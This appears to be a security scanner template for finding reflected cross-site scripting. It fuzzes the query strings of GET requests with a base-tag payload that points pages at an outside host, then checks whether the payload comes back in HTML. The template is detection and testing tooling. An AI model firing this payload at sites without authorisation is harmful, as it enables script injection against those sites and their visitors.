id: fuzz-reflection-xss-base-href

info:
  name: Base Tag XSS Detection
  author: netbaan
  severity: low
  description: |
    This template is designed to detect XSS vulnerabilities using a base tag payload.

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'  # Run only on GET requests

    payloads:
      reflection:
        - "<base href=//knoxss.me>"

    stop-at-first-match: true

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{reflection}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{reflection}}"

      - type: word
        part: header
        words:
          - "text/html"